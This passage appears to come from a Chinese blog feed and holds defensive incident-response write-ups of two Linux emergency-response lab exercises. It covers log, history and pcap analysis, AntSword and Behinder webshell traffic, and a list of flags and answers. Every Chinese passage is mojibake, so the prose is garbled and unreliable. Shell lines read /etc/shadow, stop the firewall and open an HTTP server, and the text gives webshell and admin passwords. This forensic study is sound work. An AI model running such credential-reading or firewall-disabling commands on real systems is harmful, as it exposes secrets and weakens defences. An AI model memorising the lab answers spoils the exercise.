alt="image-20240323154529579"></p><p>è¿æ°”ä¸é”™ï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶å°±æ¯”å¯¹å‡ºæ¥äº†å·®å¼‚ï¼Œæ‰¾åˆ°äº†éšè—çš„<code>$flag2 = &quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;;</code></p><p>è€Œå…¶ä»–æ–‡ä»¶éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Œå¹¶æ— å…¶ä»–éšè—å†…å®¹</p><p><img src="/img/Emergency-Linux-web2/image-20240323154950942.png" alt="image-20240323154950942"></p><h2 id="5ã€wp-æ–‡ä»¶"><a href="#5ã€wp-æ–‡ä»¶" class="headerlink" title="5ã€wp æ–‡ä»¶"></a>5ã€wp æ–‡ä»¶</h2><p>åœ¨å†å²å‘½ä»¤ä¸­ï¼Œè¯¥wp æ–‡ä»¶æ˜¯ç”±<code>go_build_untitled.exe</code>çš„ä¸€ä¸ªæ–‡ä»¶æ”¹åè€Œæ¥ï¼Œgo_build åƒæ˜¯ç”±go è¯­è¨€ç¼–è¯‘è€Œæ¥</p><p><img src="/img/Emergency-Linux-web2/image-20240322192037606.png" alt="image-20240322192037606"></p><p>è¯¥æ–‡ä»¶æ˜¯3æœˆ20æ—¥<code>15:34:04</code>çš„æ—¶é—´è¢«ä¿®æ”¹ï¼Œè¿™ä¸ªæ—¶é—´å¯èƒ½æ˜¯é»‘å®¢è¿›è¡Œé‡å‘½åçš„æ—¶é—´ç‚¹ï¼Œé‚£è¿™ä¸ªæ–‡ä»¶æ˜¯å¹²å˜›çš„ï¼Œå°è¯•æ‰§è¡Œä¸‹<img src="/img/Emergency-Linux-web2/image-20240322192532734.png" alt="image-20240322192532734"></p><p>æˆ‘æ“¦ï¼ŒåŸæ¥æ˜¯é¢˜è§£ï¼Œæé”™äº†æé”™äº†</p><h2 id="5ã€-pcapngæ–‡ä»¶æµé‡åˆ†æ"><a href="#5ã€-pcapngæ–‡ä»¶æµé‡åˆ†æ" class="headerlink" title="5ã€.pcapngæ–‡ä»¶æµé‡åˆ†æ"></a>5ã€.pcapngæ–‡ä»¶æµé‡åˆ†æ</h2><p>é‚£æˆ‘ä»¬æŠŠç›®å…‰æ”¾åœ¨è¿™ä¸ªå•¥.pcapng æµé‡åŒ…æ–‡ä»¶ä¸Šï¼Œå°†è¯¥æ–‡ä»¶åˆ©ç”¨python2å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ï¼Œä¼ åˆ°æœ¬åœ°ï¼Œéœ€è¦å…³é—­é˜²ç«å¢™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">python --version</span><br><span class="line">ip a</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322193011749.png" alt="image-20240322193011749"></p><p>åŸæ¥åå­—æ˜¯<code>æ•°æ®åŒ…1.pcapng</code>ï¼Œé‚£ä¹ˆæ˜¯å¦å­˜åœ¨å…¶ä»– .pcapng æ–‡ä»¶å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.pcapng 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322193131851.png" alt="image-20240322193131851"></p><p>ä¸å­˜åœ¨å…¶ä»–çš„æµé‡åŒ…æ–‡ä»¶äº†ï¼Œæˆ‘ä»¬ç”¨<code>Wireshark</code>å·¥å…·æ‰“å¼€è¯¥æ•°æ®åŒ…ï¼ŒæˆåŠŸæ‰“å¼€ï¼ˆæœ‰å…³WireShark çš„ç®€å•ä½¿ç”¨ï¼š<a href="/2024/03/01/Blue-Team-Packet-Sniffing-WireShark/" title="ã€æµé‡åˆ†æã€‘æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨">ã€æµé‡åˆ†æã€‘æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨</a>ï¼‰</p><p><img src="/img/Emergency-Linux-web2/image-20240322193324754.png" alt="image-20240322193324754"></p><p>åœ¨ä¹‹å‰çš„æ’æŸ¥è¿‡ç¨‹ä¸­ï¼ŒçŸ¥é“<code>192.168.20.1</code>è¿™ä¸ªIPå‡ºç°è¿‡ï¼Œç°åœ¨çœ‹æ¥ç¡®å®šæ˜¯æ¶æ„IP</p><p><img src="/img/Emergency-Linux-web2/image-20240322194206533.png" alt="image-20240322194206533"></p><p>å¯ä»¥åœ¨è§†å›¾ä¸­å°†æ—¶é—´è°ƒæ•´ä¸ºå¹´æœˆæ—¥æ—¶é—´çš„å½¢å¼ï¼Œå¹¶è¿›è¡Œ<code>http</code>å’ŒæºIP<code>ip.src == 192.168.20.1</code>çš„è¿‡æ»¤ï¼Œå‘ç°é»‘å®¢GETè®¿é—®è¿‡<code>flag1</code>ï¼Œè¿½è¸ªHTTPæµï¼Œå‘ç°<code>flag1&#123;Network@_2020_Hack&#125;</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322194559969.png" alt="image-20240322194559969"></p><p>å†ä¸€æ­¥æ­¥è¿›è¡Œæ’æŸ¥ï¼Œé»‘å®¢å¯¹<code>index.php</code>æ–‡ä»¶è¿›è¡Œäº†å¤šæ¬¡è®¿é—®ï¼Œä¸ç‚¹ä¸çŸ¥é“ï¼Œä¸€ç‚¹å“ä¸€è·³</p><p><img src="/img/Emergency-Linux-web2/image-20240322195313788.png" alt="image-20240322195313788"></p><p>è¿™ä¸æ˜¯å¦¥å¦¥çš„<code>webshellç®¡ç†å·¥å…·èšå‰‘</code>çš„æµé‡ç‰¹å¾ï¼Œwebshellæœ¨é©¬çš„å¯†ç æ˜¯<code>Network2020</code>ï¼Œé€šè¿‡HTTPè¿½è¸ªï¼Œä¸€æ­¥æ­¥æŸ¥çœ‹é»‘å®¢é€šè¿‡èšå‰‘éƒ½åšè¿‡å“ªäº›äº‹</p><p><img src="/img/Emergency-Linux-web2/image-20240322200419738.png" alt="image-20240322200419738"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨3æœˆ20æ—¥<code>14:33:35</code>çš„æ—¶å€™ï¼Œ<code>pe9.sql</code>æ–‡ä»¶ä¾ç„¶æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å†å²å‘½ä»¤ä¸­æ’æŸ¥çš„æ—¶å€™ï¼Œå‘ç°æœ‰äººé€šè¿‡å‘½ä»¤å°†è¯¥æ–‡ä»¶åˆ é™¤äº†</p><p><img src="/img/Emergency-Linux-web2/image-20240322201407323.png" alt="image-20240322201407323"></p><p>åœ¨<code>14:37:24</code>çš„æ—¶å€™å‘ç°æ–°å¢äº†<code>shell.php</code>æ–‡ä»¶</p><p><img src="/img/Emergency-Linux-web2/image-20240322201526755.png" alt="image-20240322201526755"></p><p>åœ¨<code>14:37:43</code>çš„æ—¶å€™å‘ç°æ–°å¢<code>version2.php</code>æ–‡ä»¶</p><p><img src="/img/Emergency-Linux-web2/image-20240322201714475.png" alt="image-20240322201714475"></p><p>è¿™é‡Œï¼Œæ˜¯ä¸€ä¸ªPHPå†°èé©¬çš„å†…å®¹ï¼Œæ˜¾ç¤ºé»˜è®¤å¯†ç <code>rebeyond</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322202040481.png" alt="image-20240322202040481"></p><p>åœ¨åç»­ä¸­å…¨éƒ¨æ˜¯å¯¹<code>version2.php</code>æ–‡ä»¶çš„è®¿é—®ï¼Œé‚£ä¹ˆè¿™é‡Œï¼Œæ¨æµ‹<code>version2.php</code>æ˜¯å†°èé©¬</p><p><img src="/img/Emergency-Linux-web2/image-20240322202232074.png" alt="image-20240322202232074"></p><p>ç¡®å®æ˜¯å†°èé©¬çš„æµé‡ç‰¹å¾ï¼Œ<code>version2.php</code>ç¡®è®¤æ˜¯åé¢é»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶ï¼Œä¸ç®¡æ˜¯è¯·æ±‚åŒ…è¿˜æ˜¯ç›¸åº”åŒ…éƒ½æ˜¯åŠ å¯†ä¼ è¾“</p><p>é»‘å®¢å¯¹è¯¥æ–‡ä»¶çš„è®¿é—®æŒç»­åˆ°<code>14:40:32</code>ï¼Œæ„Ÿè§‰è¿™é‡Œå¾ˆè¿·ï¼Œå› ä¸ºç»“åˆåœ¨è´¦æˆ·å®‰å…¨ä¸­æŸ¥çœ‹çš„<code>last</code>å‘½ä»¤ ï¼Œæ¶æ„IPåœ¨<code>14:30</code>å’Œ<code>15:04</code>çš„æ—¶å€™åˆ†åˆ«è¿›è¡Œè¿‡ç™»é™†ã€‚è‡³äºå†°èæµé‡è§£å¯†ï¼Œæœ¬äººæ°´å¹³æœ‰é™ï¼Œå°è¯•è§£å¯†å¤±è´¥ï¼Œåé¢ä¾¿ä¸åœ¨è¿½ç©¶ï¼Œå¦‚æœå“ªä½å¸ˆå‚…è§£å¯†æˆåŠŸï¼Œè¿˜æœ›å‘ŠçŸ¥ï¼Œæœ¬äººæ„Ÿæ¿€ä¸å°½ï¼</p><p>åé¢æ²¡æœ‰äº†ä¸€ç‚¹çº¿ç´¢ï¼Œè¿˜æ˜¯æŠŠç›®å…‰æ”¾åœ¨äº†æµé‡åŒ…ä¸Šï¼Œçœ‹åˆ°é™¤äº†httpæµé‡ï¼Œè¿˜å­˜åœ¨è®¸å¤šssh æµé‡ï¼Œä¸¢ï¼Œè¿™æ€è·¯ä¸å°±æ‰“å¼€äº†ï¼æˆ‘è¯´è¿™ä¸ªé¶åœºæ€ä¹ˆå¥‡å¥‡æ€ªæ€ªçš„ï¼ŒåŸæ¥è¿™ä¸ªé¶åœºè€ƒå¯Ÿå¹¶ä¸æ˜¯è¿½è¸ªæº¯æºå…¥ä¾µçš„æ•´ä¸ªæµç¨‹ï¼Œé‡ç‚¹åœ¨æµé‡è¿™å—ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨wireshark ä¸­è§£å¯†ssh æµé‡éœ€è¦ç”¨åˆ°ssh çš„ç§é’¥ï¼Œè€Œé»‘å®¢åº”è¯¥æ˜¯é€šè¿‡å…¬é’¥è¿›è¡Œçš„ç™»é™†ï¼Œé‚£ä¹ˆç§é’¥æ€ä¹ˆå¼„ï¼Ÿ</p><p>æˆ‘ä»¬æŠŠ<code>id_ed25519.pub</code>ç§»èµ°ã€ç•™ä¸‹å…¬é’¥ï¼Œç”¨ç§é’¥å°è¯•ssh ç™»é™†ï¼ŒæˆåŠŸï¼Œè¯´æ˜è¯¥ç§é’¥å¯ä»¥ç™»é™†æˆåŠŸ</p><p><img src="/img/Emergency-Linux-web2/image-20240323122229620.png" alt="image-20240323122229620"></p><p>æˆ‘ä»¬æŠŠè¿™ä¸ªç§é’¥ä¸‹è½½ä¸‹æ¥æ·»åŠ åˆ°<code>wireshark</code>ä¸­ï¼šåœ¨ã€ç¼–è¾‘ã€‘â€”ã€é¦–é€‰é¡¹ã€‘â€”ã€Protocolsã€‘â€”ã€sshã€‘</p><p><img src="/img/Emergency-Linux-web2/image-20240323122936704.png" alt="image-20240323122936704"></p><p>æˆ‘äº†ä¸ªå¤§è±†ï¼Œè¿™æ ·ä¸è¡Œï¼Œsshæµé‡ä¾ç„¶æ˜¯åŠ å¯†çŠ¶æ€ï¼Œå’³å’³ï¼Œè¿™é‡Œå°±ç ”ç©¶åˆ°è¿™é‡Œï¼Œæœ‰å¸ˆå‚…èƒ½è§£å¯†çš„è¿˜æœ›å‘ŠçŸ¥ï¼Œæœ¬äººæ„Ÿæ¿€ä¸å°½ï¼</p><h1 id="ä¹ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥"><a href="#ä¹ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥" class="headerlink" title="ä¹ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥"></a>ä¹ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">rpm -Vf /usr/sbin/* &gt; 1.txt      #ç”±äºç¯å¢ƒé™åˆ¶ï¼Œæˆ‘ä»¬å…ˆæŠŠæ‰§è¡Œç»“æœä¿å­˜ä¸‹æ¥å†è¿›è¡ŒæŸ¥çœ‹</span><br><span class="line">cat 1.txt | more</span><br><span class="line"></span><br><span class="line">#S å…³é”®å­—ä»£è¡¨æ–‡ä»¶å¤§å°å‘ç”Ÿäº†å˜åŒ–</span><br><span class="line">#5 å…³é”®å­—ä»£è¡¨æ–‡ä»¶çš„ md5 å€¼å‘ç”Ÿäº†å˜åŒ–</span><br><span class="line">#T ä»£è¡¨æ–‡ä»¶æ—¶é—´å‘ç”Ÿäº†å˜åŒ–</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ï¼Œæœ‰å‡ ä¸ªæ˜¯æ˜¯å­˜åœ¨æ”¹å˜çš„æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶éåé—¨è¿™ç§</p><p><img src="/img/Emergency-Linux-web2/image-20240323161737232.png" alt="image-20240323161737232"></p><h1 id="åã€è¢«ä¿®æ”¹çš„å¯†ç "><a href="#åã€è¢«ä¿®æ”¹çš„å¯†ç " class="headerlink" title="åã€è¢«ä¿®æ”¹çš„å¯†ç "></a>åã€è¢«ä¿®æ”¹çš„å¯†ç </h1><p>é‡æ–°çœ‹äº†ä¸€ä¸‹<code>/etc/shadow</code>ï¼Œå‘ç°é™¤äº†wwwç”¨æˆ·è¿˜å­˜åœ¨mysql ç”¨æˆ·ï¼Œå†è”æƒ³åˆ°ä¹‹å‰webæ—¥å¿—ä¸­çš„phpmyadminçš„è®¿é—®ï¼ŒçŒœæµ‹å¯†ç ä¼šä¸ä¼šè—åœ¨æ•°æ®åº“ä¸­</p><p><img src="/img/Emergency-Linux-web2/image-20240323163717316.png" alt="image-20240323163717316"></p><p>åœ¨æ•°æ®åº“çš„é…ç½®æ–‡ä»¶<code>lib/config.inc.php</code>æ–‡ä»¶ä¸­æ‰¾åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç </p><p><img src="/img/Emergency-Linux-web2/image-20240323164407899.png" alt="image-20240323164407899"></p><p>è¿™é‡Œçš„è¯ï¼Œæˆ‘ä»¬åˆ°æœ¬åœ°çš„æœºå™¨ä¸Šè¿›è¡Œè¿œç¨‹è¿æ¥</p><p><img src="/img/Emergency-Linux-web2/image-20240323164658694.png" alt="image-20240323164658694"></p><p>è¿æ¥æˆåŠŸï¼Œåªå­˜åœ¨ä¸¤ä¸ªæ•°æ®åº“ï¼Œä¸€è·¯å‘ä¸‹å°±å¥½äº†ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹<code>x2_user_group</code>çš„ç”¨æˆ·ç»„è¡¨ï¼Œç®¡ç†å‘˜çš„ç”¨æˆ·ç»„IDæ˜¯1</p><p><img src="/img/Emergency-Linux-web2/image-20240323165225766.png" alt="image-20240323165225766"></p><p>å†æŸ¥çœ‹<code>x2_user</code>è¡¨çš„å†…å®¹ï¼Œä½†æ˜¯å¤ªå¤šäº†ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹éƒ½æœ‰å“ªäº›å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;x2_user&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240323164949448.png" alt="image-20240323164949448"></p><p>æœ‰å¥½å¤šå¥½å¤šï¼Œçœ‹ä¸è¿‡æ¥ï¼Œæ¢äº†ä¸€ä¸ªMySQLå›¾å½¢ç®¡ç†æ¥æŸ¥çœ‹</p><p><img src="/img/Emergency-Linux-web2/image-20240323165927883.png" alt="image-20240323165927883"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ª<code>peadmin</code>ç”¨æˆ·çš„<code>usergroupid</code>å€¼ä¸º1ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å¤§æ¦‚ç‡æ˜¯ç®¡ç†å‘˜ï¼Œå¯¹ä»–çš„å¯†ç è¿›è¡Œè§£å¯†</p><img src="/img/Emergency-Linux-web2/image-20240323170427835.png" alt="image-20240323170427835" style="zoom:150%;" /><p>æˆåŠŸè·å¾—æ˜æ–‡å¯†ç ï¼š<code>Network@2020</code></p><h1 id="åä¸€ã€é€šå…³å¯†ç "><a href="#åä¸€ã€é€šå…³å¯†ç " class="headerlink" title="åä¸€ã€é€šå…³å¯†ç "></a>åä¸€ã€é€šå…³å¯†ç </h1><p><img src="/img/Emergency-Linux-web2/image-20240323170858240.png" alt="image-20240323170858240"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1,æäº¤æ”»å‡»è€…IP</span><br><span class="line">192.168.20.1</span><br><span class="line"></span><br><span class="line">2,æäº¤æ”»å‡»è€…ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡)</span><br><span class="line">Network@2020</span><br><span class="line"></span><br><span class="line">3,æäº¤ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefgåªéœ€è¦æäº¤abcdefg?abcdefg)</span><br><span class="line">index.php?user-app-register</span><br><span class="line"></span><br><span class="line">3,æäº¤Webshellè¿æ¥å¯†ç </span><br><span class="line">Network2020</span><br><span class="line"></span><br><span class="line">4,æäº¤æ•°æ®åŒ…çš„flag1</span><br><span class="line">flag1&#123;Network@_2020_Hack&#125;</span><br><span class="line"></span><br><span class="line">5,æäº¤æ”»å‡»è€…ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§°</span><br><span class="line">version2.php</span><br><span class="line"></span><br><span class="line">6,æäº¤æ”»å‡»è€…éšè—çš„flag2</span><br><span class="line">$flag2 = &quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;;</span><br><span class="line"></span><br><span class="line">7,æäº¤æ”»å‡»è€…éšè—çš„flag3</span><br><span class="line">flag3=&quot;flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘çŸ¥æ”»å–„é˜²Linux Web1é¶åœºå…¥ä¾µæ’æŸ¥</title>
      <link href="/2024/03/21/Emergency-Linux-web1/"/>
      <url>/2024/03/21/Emergency-Linux-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="çŸ¥æ”»å–„é˜²Linux-Web1é¶åœºå…¥ä¾µæ’æŸ¥"><a href="#çŸ¥æ”»å–„é˜²Linux-Web1é¶åœºå…¥ä¾µæ’æŸ¥" class="headerlink" title="çŸ¥æ”»å–„é˜²Linux Web1é¶åœºå…¥ä¾µæ’æŸ¥"></a>çŸ¥æ”»å–„é˜²Linux Web1é¶åœºå…¥ä¾µæ’æŸ¥</h1><p><strong>å‰æ™¯éœ€è¦ï¼š</strong>å°ç‹æ€¥åŒ†åŒ†åœ°æ‰¾åˆ°å°å¼ ï¼Œå°ç‹è¯´â€æå“¥ï¼Œæˆ‘devæœåŠ¡å™¨è¢«é»‘äº†â€,å¿«æ•‘æ•‘æˆ‘ï¼ï¼</p><p>æŒ‘æˆ˜å†…å®¹ï¼š</p><p>é»‘å®¢çš„IPåœ°å€</p><p>é—ç•™ä¸‹çš„ä¸‰ä¸ªflag</p><h1 id="ä¸€ã€è´¦æˆ·å®‰å…¨"><a href="#ä¸€ã€è´¦æˆ·å®‰å…¨" class="headerlink" title="ä¸€ã€è´¦æˆ·å®‰å…¨"></a>ä¸€ã€è´¦æˆ·å®‰å…¨</h1><p>æ£€æŸ¥<code>/etc/passwd</code>å’Œ<code>/etc/shadow</code>æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep -v nologin      #æŸ¥çœ‹å¯ä»¥ç™»é™†çš„ç”¨æˆ·</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow  #æŸ¥çœ‹å¯ä»¥è¿œç¨‹ç™»é™†çš„ç”¨æˆ·</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320115023026.png" alt="image-20240320115023026"></p><p>æ­£å¸¸ï¼Œåªå­˜åœ¨rootå’Œä¸€ä¸ªæ™®é€šç”¨æˆ·<code>defend</code></p><h1 id="äºŒã€å†å²å‘½ä»¤æ’æŸ¥"><a href="#äºŒã€å†å²å‘½ä»¤æ’æŸ¥" class="headerlink" title="äºŒã€å†å²å‘½ä»¤æ’æŸ¥"></a>äºŒã€å†å²å‘½ä»¤æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">history          #æŸ¥çœ‹rootå†å²å‘½ä»¤</span><br><span class="line">cat /home/defend/.bash_history       #æŸ¥çœ‹æ™®é€šç”¨æˆ·defend çš„å†å²å‘½ä»¤</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320115445035.png" alt="image-20240320115445035"></p><p>åœ¨root ä¸­æ’æŸ¥åˆ°äº†ç›¸å½“å¯ç–‘çš„æ“ä½œï¼Œå‘ç°äº†<code>flag&#123;thisismybaby&#125;</code>ï¼Œå¹¶å‘ç°äº†å¯¹<code>/etc/rc.d/rc.local</code>å¼€æœºå¯åŠ¨æ–‡ä»¶ç¼–è¾‘çš„å¯ç–‘è¡Œä¸ºï¼ŒåŒå°ç‹å•†è®®è¿‡åï¼Œä¸€è‡´è®¤ä¸ºå±äºé»‘å®¢çš„æ“ä½œè¡Œä¸º</p><p>æŸ¥çœ‹è¯¥æ–‡ä»¶çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320120839955.png" alt="image-20240320120839955"></p><p>é™¤å‘ç°<code>flag&#123;kfcvme50&#125;</code>ä¹‹å¤–ï¼Œè¿˜å‘ç°äº†å¯ç–‘å‘½ä»¤<code>touch /var/lock/subsys/local</code>ï¼Œåˆ›å»ºäº†ä¸€ä¸ª<code>local</code>æ–‡ä»¶</p><p>å¥‡æ€ªçš„æ˜¯ï¼Œè¯¥æ–‡ä»¶æ²¡æœ‰ä»»ä½•å†…å®¹</p><p><img src="/img/Emergency-Linux-web1/image-20240320121043191.png" alt="image-20240320121043191"></p><h1 id="ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"><a href="#ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"></a>ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320121424436.png" alt="image-20240320121424436"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -aux  #æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">top -c -o %CPU     #å®æ—¶æŸ¥çœ‹é«˜CPUè¿›ç¨‹</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321131151005.png" alt="image-20240321131151005"></p><h1 id="å››ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥"><a href="#å››ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥" class="headerlink" title="å››ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥"></a>å››ã€å¼€æœºå¯åŠ¨é¡¹æ’æŸ¥</h1><p>è¿™é‡Œåˆè½¬å›æ¥äº†ï¼Œä¹‹å‰æ’æŸ¥è¿‡è¿™é‡Œ</p><p><img src="/img/Emergency-Linux-web1/image-20240320121716236.png" alt="image-20240320121716236"></p><h1 id="äº”ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥"><a href="#äº”ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥" class="headerlink" title="äº”ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥"></a>äº”ã€å®šæ—¶ä»»åŠ¡æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alsh /var/spool/cron/</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240320121941529.png" alt="image-20240320121941529"></p><h1 id="å…­ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥"><a href="#å…­ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥" class="headerlink" title="å…­ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥"></a>å…­ã€å¼‚å¸¸æ–‡ä»¶æ’æŸ¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚/tmpç›®å½•ä¸‹çš„éšè—æ–‡ä»¶</span><br><span class="line">sshå¯†é’¥ç­‰</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321134447424.png" alt="image-20240321134447424"></p><p><code>/tmp</code>ä¸‹æœªå‘ç°æ•æ„Ÿæ–‡ä»¶</p><p>å‘ç°root çš„.sshä¸‹å­˜åœ¨<code>authorized_keys</code>å…¬é’¥</p><p><img src="/img/Emergency-Linux-web1/image-20240321134537128.png" alt="image-20240321134537128"></p><p>æ£€æŸ¥æ”¹åŠ¨æ—¶é—´ï¼Œå‘ç°æ˜¯3æœˆ18æ—¥<code>20:22:39</code>çš„æ—¶é—´è¢«æ”¹åŠ¨</p><h1 id="ä¸ƒã€æ—¥å¿—æ’æŸ¥"><a href="#ä¸ƒã€æ—¥å¿—æ’æŸ¥" class="headerlink" title="ä¸ƒã€æ—¥å¿—æ’æŸ¥"></a>ä¸ƒã€æ—¥å¿—æ’æŸ¥</h1><p>å®‰å…¨æ—¥å¿—æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼š<code>/var/log/secure</code>ï¼Œæ˜¯sshç™»é™†æˆåŠŸä¸å¦çš„ä¸€ä¸ªå®‰å…¨æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Accepted&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr   #ç»Ÿè®¡IPçˆ†ç ´æ¬¡æ•°</span><br><span class="line">cat secure | grep &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321124831028.png" alt="image-20240321124831028"></p><p>å¯ç–‘IP<code>192.168.75.129</code>å¯¹rootç”¨æˆ·è¿›è¡Œäº†ç™»é™†ï¼Œå…¶ä¸­91æ¬¡å¤±è´¥ï¼Œ1æ¬¡æˆåŠŸï¼Œæˆ‘ä»¬é’ˆå¯¹91æ¬¡ç™»é™†å¤±è´¥çš„æ—¶é—´å†è¿›è¡Œä¸€ä¸ªæ’æŸ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Failed password for root&quot; | awk &#x27;&#123;print $1,$2,$3,$11&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web1/image-20240321125536678.png" alt="image-20240321125536678"></p><p>ä»ä¸‰æœˆ18æ—¥<code>19:29:43</code>æŒç»­åˆ°<code>19:29:51</code>ï¼Œ8ç§’é’Ÿä¹‹å†…å¤±è´¥æ¬¡æ•°91ï¼Œåˆ¤å®šä¸ºsshçˆ†ç 